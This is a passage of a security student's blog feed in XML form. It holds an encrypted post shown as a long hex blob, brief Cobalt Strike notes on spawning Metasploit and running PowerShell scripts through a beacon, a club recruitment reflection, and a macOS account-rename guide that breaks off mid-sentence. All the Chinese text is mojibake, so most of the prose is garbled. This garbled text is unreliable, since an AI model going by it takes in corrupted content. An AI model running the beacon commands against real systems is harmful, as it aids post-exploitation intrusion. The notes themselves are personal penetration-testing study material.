b7bc65bbcf6d5ff773ef24dc7c39fd49fe8fd4428c6d0f37a3b1e8e27103b8cc2dde52a60652facfbb66fcf45453fcb8f3576e5f6f884ee64349654c1d4cf5c4e48db0811ce14455a07d16809c1de0d5c4dd6e9f724391fea05d6f83370d0d8b0bcf2fcf0849bf28370e8557c983c5aefa6a3cbf2e90a9ca912a5542d82a6c379ee4417276affbede64e2f7688b6027c6cf0d47db2caabe3d9341bec86b92bf3647a50376b76d254d0a1682ca2262d8b7d5de3c3991c13077bce42765ddedc97697e7a5b32e895c88b2aff806a7c1792e2d50c18f219f9706bb8c29879db9cf1e8f1ef0f7313bc7b6732d48687829e92a78ccb532c01920d849f5b22207e70a944256db740933e427ddea23be68ae5d9522e5e0fede1f877d5e6cb856ffd1f057e3619f8a63a3c73e807f0c75bc93ee423ae5452963a388e7d14a29af4b0e64a212a5578f7372708fc1074ea7ec054124d18e776d3efea018f24e139b6a357ac48328d42b9385d6a0b7f270fcd5d0794b508668d33940b0ddfca980761c63d4c9d5fee6956982501ef7d98b84c94f5d4fd24517c7a55f4f15d04f52359c29c8c4845bbb861a4e123ba78e2838385f2fa72ff7534364ee93015b421e569000410d5c23def491fb8df6bf1e6f3f1b9ac37f27c1ced72c22cf53da013b4ab9bbfd9b6f494894e96624e2650475ffc3fd41a46d142e98f89387629a701a85645b8506203a21e05cb74463904ecbe9229d9be4140438af402955ecbf274fa8d5b010292ccde3c01139bbb8e28bffcad0934e2b5a6dada029098d4b456d77fffe346ffc75fce2fe96e5d54324888b6784e94880c249e7950e5781396bde323e64fd0f16f9047643119d6007dc9fa371de856194c4e8002a4e1de4b8309424aff5f6753c6957640c761dcf4c011141ff23f81d00d0366f48fc92703a04620e53e4dc5f05f307746fe3c6e55c37db8f7f9d090b0a3b2675deb3707ce348c0658f4df78bcc4bb3c4f14bfd724b98e9ce7e55f46424cede58f36676b81fcace724ecd3fe96e18bb01efe9f635f7476caf24ea8e78fbbc7a2e488a27d7f029312da44a6f4b7bf5beb1ed87664b93a6a627eae308ee537eef8f335538ca5fa4fa10c2e8d64bb83fd6681cd130ae720b7d97b7814b3031951786132f26fada54cf082c4d87fee503c7666976977541fb2e1ca114bc1468e23947ef64d3bac5bee20b0ae6a2d0dce8e724a813c186219f8d46508828b4dfe41e0e91ecb87f2315657ceb35b5310876e84ab56c62ab19cbd492eee74fe2fdb3cc8dd33c7a6af47f5369d11448a2a59633e2f53d18df1d59e4f7fc0c175d5c9b6e287f7dc4ceec3989c49937f2f98f40da7be31462e91cc69e52b7f776c0e694c45ef5783a242df7ff15177216419741bc2ce32b4e1c30f153c43bc4d31ff7a21c6a177d4c477e7b24523b918fd5e4363e6e094e8e6341c00c04a3d8648f350e78b499012ee81d06a8d2f3b6bd992724e09f219179874abe4fa2594f4ee74544b2971aaeb200cd90f5be9352ec97b59ae0f2f9b4f22b8264cc18685d62d71aaf44a4abbcb789538234f9b4665c651ba74a7a7a72a40574c7e98f73f620e4c2bc42e2b46c5e744caf2fb6c63dca7f94d18c48f6f77b08ac067f5acc828e2bcc544845dd29975323d35c9499b1b4bb7da0d2dbe9099bb1825122435aee43a4c761f36f5d8a6d8e113cc2c97eda68b6d66dca664fa04b4b6893c1a2965bc6478dbbf5a4627719dbf263554e7830c9228f4d2e06c18cd527b50cbd6715e8cdaff75c4a1116e02d8ae66bbc2d004b0d0c118113949d0c183337d56db46d275fd5f1c9be4134fce9dbc11836fddea015caccf871e871efa669873e01a8379f45facd86c4e0fcda96832a76bdf97dc2037169de5925bdf6298c7186551b497c65bbddd3174d82fb50aebab2c27dcf11b7a4996ebeda9d24755a6376af90a41ef0e76ad6b3e3474afe6e29c69bcbb8b28ef418fa0dd612ac6c69f726febd67b0260cc1151c026bbd7fd02f2be447ca69f865d7ed161b8d4b9ed516e077a698350228b54a7b4cac63105f1e257cdad0eabd094fd591bd127c2b5b3842785efa6dd4db25bf78b7595c6de137e36f8a4b50125ec4fbe44fd1f3840517d17901a23567831c41911ea6692355d63495852a004f46be743b3d51df4224ad57a6e7efadf4266f0b13ce2ebc88da279db13d74b664c3c7ef8caf5570513d233daf1ed743ae141469cd1eb7c9e09fe72be23d1998cea2b988caa9c397ac255b0aeee333a92a2de6b75cd3897db21716188e149286dfd43cc807e738f6b82f1109e1b0513ebf74cc8d21e5242d7026a65991789797015fa62fff2b9569fdca234307f254624d9329ce52f825e7f1cea2054eeac2a867583632f5dab4787e0901661d1e6430937a89f67057cdbcd6b8b614cbb7fa79ceb958f2c2275c4b574295ace647fc294014d27815a27ada5260532c0c69b615ff0713bdbcea8d3e00768b1cf9764b6ea36ae16a77f32b3ff2d8d087b4d754f5e1d0009e407809ae09a55fdfb0645b6d94d868341b93baed0e4289aa610605b5a11b016fda38fbb156d51a4049f159f052bc5b8a5e14c85bfd530f6fc3300f2c81b4faf777d99f30d09592f7c5a81e965860450c0e40e5412a50c7d390b639c5f6158352d8fac8b0ffd9ef99a0907ab45543dd2c3f51658e4103c343af881ec09d77fd1eb982d4ff41108e4d4511f6c105b36620690044461844b5e161e90e839113ae136767c01a0e9d3b36111a00e67d442085fd0eabb938f67de461f40b271e50cbcf90ecef5941778498e8025710f9a2250ddf194aa31463d10283e4706003b0845f0d0cd0499af0c712bc1fc1c5a7003175f56274dc8641fd5eebd9fb93fd5b21aa8605062acacba84c9002325cd77363f9dc455b97b815a04a659321c88ac9c6c3d4928675f0bbeef6d5bbecac9c1b4c46a993d85c002d3542dfde9cd07346906ec21ea13f67313dc721d87bf60ff269978c33c78f4138c52adbc9f509ccfeae4cb4d209bec000e94f67ad158256b8db18f3425fc0572acfaa3e2140d18307229eb801200a3676f0821cd9bd9247740d1b69c2a78a3441e91c6daf4def9b8578efa8d23e6d1bd2d557fb8cb962971efce906aa9ef2b2038e71655ea5a7a4d5111407ec76657b32177a57648103b526ecf5a002ee999c3b803db100cea10afcae929e510ca1e1c0fd8735b4ed81e6bc2e290045ba614819ea55a2bfc4fc876416f85cdd606e43227fed4e513e9e1777ddcdd2441d5bc236928dfbc8675f41c398f5dd45cf2ab580fcbb58d49e8806152300f76b0707c85ad9cb2d6147ede1436c819539090d37d9dbe335f9042e46465fc74bd0e048ca0415c3d90a6f297cb5e2e952b91ccdd8e0f2cbaa6a34c6eec0b8bfe24599062dc3105dc023a4361d349b565d7afd1b644a4c9e65727de7614fb8e0b8e74d6583ef318621bb1a896543ebd642088e11b0d9ec2e0a6c3513c4fbca2985b2f66d767dad29da89b012f7fc8114f4140b06acb4dda5ead26863322d23b27d2208ff8e3c6abc30b85afc23195e15051a6c0d30c5e130fdda4255e24594f5e48d39a2a1e137af68794b8a06480a8353c626c2856bb886529a38e162b2d053f7d6bd0a5e3572370fc9d1966bea8e88f134fe2d992630b48d9d2591471b7d29a82ee1204c897804b653a63bbf41307d6340dd72a7a78b9674f4ce5acb3a74fce7dba0afd9be497d72d8d2f94468e701dd563238f300ff260dc9cb97adda604cfed49b300d79d3ebf6581548c3cce4b3e61f1810a4021fe34b2de6dd671ca83bef1706614355c9e74e51e4ae172c7c0a5ec2c1436a1ac70ce0b005dfbe79929484a1a39b2d2ae9feb63a1681d9870c2cd468769271ede02a7564bc756ab521d294aff8ab73e828f30183b8f9df6781fe3ac8fede6281d023ee7cd6d43237955bb11535a73516b3d2cbd6848c1ccacc3063538471beb1abd1cd8422ca1855fa97e264d1103533a229386a4d258e075ad6b54f6205ec4a7698a3ee97c1478d6782c55d702db0e61a7d86a9b5277cb58d47a772554f4e37928ff82f94c558790fdaee1988bddc0bd27dab34c6197e2fa47bb3415f229851471310b0264121a0bb9a5d5a27d455a8b3d385a5505f87c7912c4f37ab84e49126d8f4125719340431dd3fcb0f02120e7eb1b019fd06a56557a5c4cd8caf12344a1597869af0c8df532d09a9b35ba8996a8b500d1d66ff12619043e83077330933476e0d87abec2173124d2a937979a4d3ca77f47cba95338590077aeaccd5584bfd13d5b4f0a7e0512083362d64887ba62099b20038c82a8db7072e2635f53fcd72315ea3c7ed01439a7ef33ed08e33b192f82b5cf8ecf08590e5f09852654c379aa0842b2dca98bba923405e290a1cf04780cf60b73e14b93bb05c715b1e1227888b0868a9000ccb382a0916db6e84780d52232ae17c01b1a9c5847d21991e237bf4ba40a70108454218dbc0055af9519e53a4081c981caf2476d6aa27d66ab577d2c1fc263b73731400e54410a1685c525473aa0255141e33667b3d41828c81f3b6915bb06ed891eda5458ad0a1f629205edf47e27f6449866568069a54aa42bc66105ff76f918d10d75c6274ca375cec542bbade714c08c6331f69ced8a917da23241b4158012e55a250dd2c1bed5d162c63525f00698a181f0b88fdd9553ac05980a35b14b47aa2387ee65ea23319a76608c907cdc6ba0f327bf97a5984c20f3b4963691c7341e90f269491eb52dcc96f756677ef1d1bd5c9b59ec1d0d80304fd746973d5a1cc2c50d4250d47e061792aeedb814f5cc6fa3b7dd323e0a8285f9f5cee016d556e0c62555955661b07cc4c6feb566a7dadecbc2d93360b31c999fce0b1994f1e68f29a46e03862edc3d010813191abcb36ba1ae81f948e8a870be05c918cd0fcb537c82b709dabef826a039a69545f8debc8378617d61c4a4489c869c07510d16562f8a500b15007f090b0ed5f3b80acb04693bb5123b6161b7cead1d153293682240b42c66d62f2df3d89ff20836d58e174701c785142efa85186b8c1db634e02229050e7ed79dcb95ec135f2a6d8d7b83e35b02c2e4f2c1d5558e090ee37628c7394b9028c7ad94eb79d63b6e0620cb092ccf381f92a9472d505111dbe2fde75bd268afa76f7396a996b76e288973518bf543c0f5d083c3cbfec1ab6e8fa971983a4df191c253c5ebf69597ac0cf109b16752eeda8179a40f9b3a9862d1d3d1dd063b1ccc51bada60e1d33a3d152a4cc4c0402244c7fa88bc42fe4c12c08ecb96104c30233f37b17276d8dcc0329f581fae93320c3a2a557eef621fb58c3611ee44b4f431da29cd1529a8e9ec2825767124d409f0b5d613455092b715e05080f26385b56df2b4523ff114fa316bf0c0b99972b6f65c2f9d00f9b15cbea71f3973705f003046ea2c3fac872a3e1d9b6ae1f863cfb26b8525d1b7f86c548a96ef7bd0ba01a85f20f09539d2e12a37b5e3348a9240d46f5bab915a3bea59181922828ef2f3248fa62fd9c7651ce95bca890e1e7ac635fcaf6b9edbd0cc3a0b940b11c7687601d43d87198a84053c25e6db2f39ac0b65eb7d3aba55c8f95c3438997f44d2623ac78933f04a83103d3e0a63d53ec6d3b901ed3c817804f64926f443fa90aa0b2796499e2846d540c4d612ade7e7c56cca5c9d7671845136b174fae16e780742b9f99ff57a056a32839f112478a21bb990c288f10a400cc91ae16ffe1320bab00b06f906c238e9ce6288ce0cf60eaf09c236828227ce42278ba2db77f5a6a5680942c318aa8ded1fb83e0e0973e99969ac2a32f8a0eb1fc71e8c84669c64ef8d3dc19df3e28ba4d780c16f60f13f9184f1a8f65fe2acb3c27a5bb1f90b624c9453678752780da740bf33f6b7a2f498516a5b2d7f31bcfcbda026a2cfb714df136a3a31c50b4d0f36f7a405c914168cde9cd536a4ce8d46d64894cecec5dfcbfaf0d2926f2bfd67fd152f007afc4928f24c8eee7de855823a9d4cb293997400680b42424df54ab19d5156aa22aa40269fa707be4f9cc1841d8c9cfc6975fc753cd1d8890d936caf0533ebe0dad300a8233413e61ef4216ab89f8136096ed92dc0ad0353f8a286c3c25d824cc0752eab11c6503a2f0335612edd9df6355f26d2754266235e18ea799e27d1edd3c34b69e06241a3a19adf6eaec0f84485b9272d38a6e1be9c029cb15c0399dfdb23919491fe177a1f4cb6e27c85dd908bbd8706eda4e20b9e40d8c8be1c3b3a8d672bc7fe6a02fa4f210ee8104c26a3db4ba1b2242d736640921c80e592f6023b2b1ea976744a970025add3bfb085a9f2e084fdf185e7605abbcbce8d8d7dd6e9d726f70c6306215209c0d10b913ac2b8e1d2e0cdc3bad16f3c0d327498e99882ec29ba106086e4912e9175c70413c21a0bc7f368a49169b07b6015051334acf3e0952ac9b808b35fc44d8778da163eebbb200bad46ca71480681764bcca83a386a83fcf2283bd00d88477018d98b3209d8b0e955d0114547835f794b778ea015dd9d016d12083f6f9145790a20c8d857f097445f96b15b4c9d9afa0133476e92b7ed7da037eae818d6fe628e5e6dd557da4492f25d8dd7df418a76cd3b99cdc50b609b3caa25e2433d646b0884404a621d27446248c2923e07c08fb1ecea4cfcee06891e2b13e6f48e92a45a4ebf76440322221db9ca150a5f6ee4cd17672c4fe467b527d8d47f793012df005015d4c59a531813ea8321ebd2f7573c2562862510baa51337152b7704c5f042ebcc4cee28f337cbffa34a1e60c233223e06947a29b54c2c1534a010a71f8ac857f3ca547649ca38760b7c068ebf687922370bb38fe256b5d4db09f62349426f1196fbb09d8e29cb3b641f1da8c8897ed50e7e27cd043eb9a00cca6228f29a4718b0ce991121e6842dba32043a3659528a7e17bc063ecd15f62a1f79c978e182d41d1bba9468730953923daca96ace3748df93a88b4ecd8a04b9d969d6b1cb4120044251719dd922aa5686a0c987eaeb74985f24ef5c818aa892f334c47b7416f9ce9d348a93a1d49f55a8204cafc1c1ce6c23233d01a7354322b8cd8b7ba1c30ce4dc4cfcb152c71cd7a62705697057871f09f8690b2e447efc03cbd7159711636b3b79ffd8dd0c2baaffd10e2986d5dfe9aae7d7f94d30dc734593f80e957aa654f7ee5643b8e0b18f6b92c6af7bc72aafa7a9285e948f3b528facb60d07d67d676dde2d708a091294a9b093d0acca712c09cfd76ce5e8e3ccabc889f52681e2bfc69d74151cfbfa6f9d644ab7898536decf148836eba215d32930c5b7014ee673248389d934b413ac2edcb023c27461dd05c088c1eff12d5bf9fbdab462b3fe3524fe268ab5d0c4f9223f254535e801c87e7d634911655c5ec7d01345a14221ac0c7a61b5ba8a7aadeb3f1a57c27ab6af642d3c88785f95e3fee264169b2028550b4e4ad146fc302d8e54b3ad4ff9b2eada8c045fc738e00167b069cde44c177acfcb399d10f1e9d0a72c9112808247eaadcca7526fff6325a041054533c1413589459cd3601f652c8480ea19f54e17928a9f2ce15b8d5073570760766ab2d002f0161ef05230f2d6f83acb3bf39b37bfc5af253a66e396f0ac45a03247bdda44c07ddfcb5a2307750e7c47ba66f534f1a4cab79efdc87ce853d40f48ba3147d75b0699515a5e46cdd218a2c347cedd1d7c52e19932cc62d409fd4768580995a1fd0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">æœ‰ä¸œè¥¿è¢«åŠ å¯†äº†, è¯·è¾“å…¥å¯†ç æŸ¥çœ‹.</summary>
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike</title>
    <link href="https://hack-for.fun/558a.html"/>
    <id>https://hack-for.fun/558a.html</id>
    <published>2020-11-04T13:33:44.000Z</published>
    <updated>2020-11-04T15:33:14.631Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº›å…³äºcsçš„ä¸œè¥¿~</p><h1 id="CS-æ´¾ç”Ÿ-MSF"><a href="#CS-æ´¾ç”Ÿ-MSF" class="headerlink" title="CS æ´¾ç”Ÿ MSF"></a>CS æ´¾ç”Ÿ MSF</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104225034.png" alt="image-20201104213742247"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104233130.png" alt="image-20201104213816240"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213842.png" alt="image-20201104213839479"></p><h1 id="é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§"><a href="#é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§" class="headerlink" title="é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§"></a>é€šè¿‡powershellæ¥å¢å¼ºcsçš„å®ç”¨æ€§</h1><h2 id="åœ¨beacon-shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š"><a href="#åœ¨beacon-shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š" class="headerlink" title="åœ¨beacon shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š"></a>åœ¨beacon shellä¸­å¯¼å…¥å¤–éƒ¨psè„šæœ¬åˆ°è¿œç¨‹æœºå™¨ä¸Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell-import &#x2F;root&#x2F;test.ps1 &#x2F;&#x2F;å¯¼å…¥å„ç§powershellè„šæœ¬ï¼Œè¿™é‡Œå¯ä»¥å¯¼å…¥nishangæ¨¡å—</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell  posershellè„šæœ¬å</span><br></pre></td></tr></table></figure><h2 id="åœ¨beacon-shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç "><a href="#åœ¨beacon-shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç " class="headerlink" title="åœ¨beacon shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç "></a>åœ¨beacon shellä¸­ç›´æ¥æ‰§è¡Œpowershellä»£ç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-Host</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201104213434.png" alt="image-20201104213433262"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è®°å½•ä¸€äº›å…³äºcsçš„ä¸œè¥¿~&lt;/p&gt;
&lt;h1 id=&quot;CS-æ´¾ç”Ÿ-MSF&quot;&gt;&lt;a href=&quot;#CS-æ´¾ç”Ÿ-MSF&quot; class=&quot;headerlink&quot; title=&quot;CS æ´¾ç”Ÿ MSF&quot;&gt;&lt;/a&gt;CS æ´¾ç”Ÿ MSF&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.</summary>
      
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="CobaltStrike" scheme="https://hack-for.fun/tags/CobaltStrike/"/>
    
    <category term="æ¸—é€å·¥å…·" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ</title>
    <link href="https://hack-for.fun/abc8.html"/>
    <id>https://hack-for.fun/abc8.html</id>
    <published>2020-10-23T16:56:04.000Z</published>
    <updated>2020-11-07T15:13:03.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020å¹´å°ç»„æ‹›æ–°ä¼´éšç€ä»Šå¤©çš„å®£è®²ä¼šçš„ç»“æŸï¼Œä¹Ÿç®—æ˜¯å‘Šä¸€æ®µè½äº†ã€‚å½“ç„¶åé¢è¿˜æœ‰äºŒé¢ã€ä¸‰é¢ï¼Œç­‰é¢è¯•ç›¸å…³çš„å·¥ä½œã€‚è¿™äº›é—®é¢˜éƒ½ä¸å¤§äº†ã€‚</p></blockquote><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¥é“æ ¼19çº§æˆå‘˜çš„èº«ä»½ï¼Œå†™ä¸€ç¯‡æ„Ÿå—å§ã€‚</p><p>æ„Ÿå—æœ€æ·±çš„ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªå›¢ä½“ã€ä¸€ä¸ªç»„ç»‡ï¼Œä¸€å®šè¦æœ‰å›¢ç»“åŠ›ã€å‡èšåŠ›ã€‚å¤§å®¶éƒ½ä¸€å¿ƒå¾€å°ç»„çš„æœªæ¥å‘å±•è€ƒè™‘ï¼Œæœ‰ä»€ä¹ˆäº‹å¤§å®¶ä¸€èµ·åˆ†å·¥åä½œï¼Œæœ‰éš¾é¢˜å¤§å®¶ä¸€èµ·æƒ³åŠæ³•è§£å†³ã€‚</p><p>å½“ç„¶ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¹Ÿæœ‰ä¸å¥½çš„ä½“éªŒã€‚ä¸€ä¸ªå›¢ä½“ï¼Œä¸å…ä¼šæœ‰å‡ºç°åˆ’æ°´çš„æƒ…å†µï¼Œéƒ¨åˆ†å¸ˆå‚…ä¸å¤Ÿç§¯æä¹Ÿæ˜¯èƒ½å¤Ÿç›´æ¥æ„Ÿå—åˆ°çš„ï¼Œä½†æ˜¯ä¸èƒ½è¯´ä¸å¥½ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ„Ÿå—æ˜¯é€šè¿‡å’Œå…¶ä»–å›¢ä½“æˆå‘˜æ¯”è¾ƒå¾—å‡ºçš„æ„Ÿå—ï¼Œä¸é’ˆå¯¹ä¸ªäººã€‚</p><p>ä»è°‹åˆ’æ‹›æ–°è®¡åˆ’ã€åˆ°æ‹›æ–°æ‘†æ‘Šã€ç”³è¯·å®£è®²ä¼šæ•™å®¤ã€‚ä¸¤ä¸ªç®¡ç†å°å§å§ã€<a href="http://xun9er.com/">Xun9er</a> ã€å’Œå°å¸…é”…ï¼Œå’Œå­¦æ ¡å±‚é¢ã€å­¦æ ¡ç¤¾å›¢æ–¹é¢ï¼Œè¿˜æ˜¯æœ‰è¿‡ä¸å°‘çš„å¯¹çº¿ï¼Œä¹Ÿå¾ˆè¾›è‹¦ã€‚</p><p>æ‹›æ–°æ‘†æ‘Šé‚£ä¸¤å¤©ã€è€æ˜¯ä¸‹ç€å°é›¨ã€ç¬¬ä¸€å¤©äººè¿˜å¯ç®—å¤šã€ç¬¬äºŒå¤©äººå°±æ…¢æ…¢å°‘èµ·æ¥äº†ã€‚ä¸è¿‡æ˜¯æ–°ç”Ÿå°‘äº†ï¼Œæˆ‘ä»¬çš„äººä¹Ÿå°‘äº†ã€‚ç¡®å®ï¼Œ æˆ‘ä»¬æ¯å¤©çš„äº‹ä¹ŸæŒºå¤šäº†ï¼Œä¹Ÿä¸èƒ½æŠŠæ‰€æœ‰ç²¾åŠ›æŠ•å…¥åˆ°æ‹›æ–°å·¥ä½œä¸­ã€‚èšŠå­å¤šã€æ¹¿å†·ã€‚æœ€åä¸€æ™šä¸Šã€æ¬ç¦»è®¾æ–½çš„æ—¶å€™ã€å°±æ¥äº†4-5ä¸ªå°ä¼™ä¼´ã€‚</p><p>å¥½åœ¨æ‹‰äº†ä¸ªå°ç¾¤ï¼Œä¹Ÿå°±10 ä¸ªäººåœ¨é‡Œé¢ï¼Œæ´»è·ƒçš„ä¹Ÿä¸è¿‡å°±3-4ä¸ªäººã€‚é‡Œé¢è¿˜æ˜¯æœ‰2-3ä¸ªå­¦å¼Ÿæˆ‘è®¤ä¸ºè¿˜æ¯”è¾ƒå¯ä»¥ï¼Œå¸Œæœ›ä»–ä»¬èƒ½å¤ŸåŠªåŠ›å­¦ä¹ ã€é€šè¿‡è€ƒæ ¸ã€‚</p><p>å®£è®²ä¼šä¸Šï¼Œç¬¬ä¸€æ¬¡æ„Ÿè§‰ä¸€ä¸ªå°ç»„åœ¨ä¸€èµ·åŠäº‹ã€çœŸçš„ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ä¹Ÿæ‹äº†æ‹åˆç…§ï¼Œä¹Ÿç®—æ˜¯ç¬¬ä¸€æ¬¡æ‹æ­£å¼åˆç…§äº†ã€‚</p><p>å®£è®²ä¼šï¼Œé—®äº†ä¸‹å­¦å¼Ÿçš„è¯„ä»·ï¼Œè¿˜ç®—å¯ä»¥ã€‚ä¼šä¸Šï¼Œæˆ‘ä¹Ÿå¬åˆ°å¤§å®¶éƒ½ç¬‘äº†ï¼Œè¿™å°±å¯¹äº†ã€‚</p><p>æœ€åï¼Œç»§ç»­é‡è›®ç”Ÿé•¿å§ã€‚æˆ‘ä»¬è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ï¼Œæœªæ¥çš„å‘å±•ï¼Œç¦»ä¸å¼€æ¯ä¸€ä¸ªæˆå‘˜çš„åŠªåŠ›ï¼ŒCTFæ’åã€SRCæŒ–æ´ã€CVEã€CNVDã€å¤§å‚offerï¼Œæ˜¯æˆ‘ä»¬æ¯ä¸ªäººå¥‹æ–—çš„ç›®æ ‡ã€‚</p><p>å¯¹äº†ï¼Œæˆ‘ä»¬ä¸å…‰åªä¼šææŠ€æœ¯ï¼Œ æˆ‘ä»¬ä¹Ÿæ˜¯å¾ˆæ´»æ³¼å¼€æœ—å¯çˆ±çš„ä¸€ç¾¤äººå‘€ï¼</p><p>ç…§ç‰‡å°±ä¸æ”¾äº†ï¼Œå“ˆå“ˆã€‚æƒ³çœ‹åŠ æˆ‘å¾®ä¿¡æˆ–è€…QQå§ã€‚</p><ul><li>åšæ–‡åˆ é™¤å¯†ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020å¹´11æœˆ 7æ—¥ æ˜ŸæœŸå…­ 23æ—¶12åˆ†37ç§’ CST</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2020å¹´å°ç»„æ‹›æ–°ä¼´éšç€ä»Šå¤©çš„å®£è®²ä¼šçš„ç»“æŸï¼Œä¹Ÿç®—æ˜¯å‘Šä¸€æ®µè½äº†ã€‚å½“ç„¶åé¢è¿˜æœ‰äºŒé¢ã€ä¸‰é¢ï¼Œç­‰é¢è¯•ç›¸å…³çš„å·¥ä½œã€‚è¿™äº›é—®é¢˜éƒ½ä¸å¤§äº†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;åœ¨è¿™é‡Œï¼Œæˆ‘ä»¥é“æ ¼19çº§æˆå‘˜çš„èº«ä»½ï¼Œå†™ä¸€ç¯‡æ„Ÿå—å§ã€‚&lt;/p&gt;
&lt;p&gt;æ„Ÿå—æœ€æ·±çš„ï¼Œå…¶å®å°±</summary>
      
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>MacOS å¦‚ä½•ä¿®æ”¹è´¦æˆ·å</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>ç„¶åä¹‹å‰ä¸€ç›´æƒ³ä¿®æ”¹ï¼Œä½†æ˜¯å“ªé‡Œæ˜¯ç°è‰²çš„ï¼Œæ— æ³•ä¿®æ”¹ã€‚</p><p>ä¿®æ”¹åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>ä¿®æ”¹æ–¹æ³•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>ç‚¹å‡»é”ï¼Œè¾“å…¥å¯†ç ä¹‹åå°±å¯ä»¥è¿›è¡Œæ“ä½œäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>ç„¶åç‚¹å‡» + å·ï¼Œæ–°å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>é€€å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·ï¼ˆä¹Ÿæ˜¯å› ä¸ºå½“å‰è¿™ä¸ªç”¨æˆ·æ˜¯å¤„äºç™»å½•çŠ¶æ€ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä¿®æ”¹account nameã€‚</li><li>ç™»å½•åˆ›å»ºçš„test ç®¡ç†å‘˜è´¦å·ï¼Œç›´æ¥è·³è¿‡Apple ID ä¹‹ç±»çš„è®¾ç½®ï¼Œç„¶åå»ä¿®æ”¹account nameã€‚</li><li>åˆ‡æ¢å›æ¥å°±OKäº†ã€‚</li><li>åˆ é™¤åˆ›å»ºçš„test ç®¡ç†å‘˜ç”¨æˆ·ã€‚</li></ul><p>åŸæ¥è¿™æ 